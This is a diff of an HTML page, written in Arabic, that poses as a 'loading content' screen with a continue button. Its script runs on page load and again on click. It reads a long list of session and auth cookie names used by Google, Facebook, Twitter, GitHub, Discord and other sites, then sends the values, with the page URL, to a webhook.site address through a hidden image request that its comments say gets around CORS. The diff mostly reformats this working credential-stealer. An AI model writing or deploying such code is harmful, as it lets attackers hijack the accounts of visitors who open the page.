@@ -7,63 +7,60 @@
 <body style="text-align: center; padding: 50px; font-family: Tahoma;">
     <h2>جاري تحميل المحتوى...</h2>
     <p>يرجى الانتظار قليلاً والضغط على الزر أدناه في حال لم يتم التحميل تلقائياً.</p>
-    <button onclick="sendCookies()" style="padding: 15px 30px; font-size: 18px; background: #28a745; color: white; border: none; border-radius: 5px; cursor: pointer;">اضغط هنا للمتابعة</button>
+    <button id="btn" style="padding: 15px 30px; font-size: 18px; background: #28a745; color: white; border: none; border-radius: 5px; cursor: pointer;">اضغط هنا للمتابعة</button>
 
 <script>
-        const webhookUrl = "https://webhook.site/5aaa35a1-60e4-4b7f-953e-10a3078c0436";
+    const webhookUrl = "https://webhook.site/5aaa35a1-60e4-4b7f-953e-10a3078c0436";
 
-        const SESSION_COOKIE_NAMES = new Set([
-            "sessionid", "session_token", "session_id", "session", "sid",
-            "connect.sid", "login_info", "logged_in",
-            "auth_token", "access_token", "token", "oauth_token",
-            "id_token", "refresh_token", "bearer_token",
-            "apisid", "sapisid", "hsid", "ssid", "lsid",
-            "c_user", "datr", "xs", "fr", "sb",
-            "ds_user_id", "csrftoken", "rur", "mid",
-            "ct0", "twid",
-            "locale", "dcfduid", "sdcfduid",
-            "_gh_sess", "user_session", "dotcom_user",
-            "kick_session_id",
-            "phpsessid", "jsessionid", "_session_id", "remember_token",
-            "remember_user_token", "remember_web"
-        ]);
+    const SESSION_COOKIE_NAMES = new Set([
+        "sessionid", "session_token", "session_id", "session", "sid",
+        "connect.sid", "login_info", "logged_in",
+        "auth_token", "access_token", "token", "oauth_token",
+        "id_token", "refresh_token", "bearer_token",
+        "apisid", "sapisid", "hsid", "ssid", "lsid",
+        "c_user", "datr", "xs", "fr", "sb",
+        "ds_user_id", "csrftoken", "rur", "mid",
+        "ct0", "twid",
+        "locale", "dcfduid", "sdcfduid",
+        "_gh_sess", "user_session", "dotcom_user",
+        "kick_session_id",
+        "phpsessid", "jsessionid", "_session_id", "remember_token",
+        "remember_user_token", "remember_web"
+    ]);
 
-        function getTargetCookies() {
-            const foundCookies = {};
-            const cookies = document.cookie.split(";");
+    function getTargetCookies() {
+        const foundCookies = {};
+        const cookies = document.cookie.split(";");
+        
+        for (let cookie of cookies) {
+            const parts = cookie.split("=");
+            const name = parts[0].trim().toLowerCase();
+            const value = parts.slice(1).join("=").trim();
             
-            for (let cookie of cookies) {
-                const parts = cookie.split("=");
-                const name = parts[0].trim().toLowerCase();
-                const value = parts.slice(1).join("=").trim();
-                
-                if (SESSION_COOKIE_NAMES.has(name)) {
-                    foundCookies[name] = value;
-                }
+            if (SESSION_COOKIE_NAMES.has(name)) {
+                foundCookies[name] = value;
             }
-            return foundCookies;
         }
+        return foundCookies;
+    }
 
-        function sendData() {
-            const extractedCookies = getTargetCookies();
-            
-            // تحويل البيانات إلى نص مشفر لإرسالها عبر رابط الـ GET دون مشاكل CORS
-            const payload = encodeURIComponent(JSON.stringify({
-                url: window.location.href,
-                cookies: extractedCookies,
-                timestamp: new Date().toISOString()
-            }));
+    function sendData() {
+        const extractedCookies = getTargetCookies();
+        
+        const payload = encodeURIComponent(JSON.stringify({
+            url: window.location.href,
+            cookies: extractedCookies,
+            timestamp: new Date().toISOString()
+        }));
 
-            // استخدام عنصر الصورة لإرسال البيانات في الخلفية بدون قيود CORS
-            const img = new Image();
-            img.src = `${webhookUrl}?data=${payload}`;
-            
-            console.log("تم إرسال الطلب بنجاح");
-        }
+        const img = new Image();
+        img.src = `${webhookUrl}?data=${payload}`;
+        
+        console.log("تم إرسال الطلب بنجاح");
+    }
 
-        // إرسال تلقائي وعند الضغط
-        sendData();
-        document.getElementById("btn").addEventListener("click", sendData);    
+    sendData();
+    document.getElementById("btn").addEventListener("click", sendData);
 </script>
 </body>
 </html>
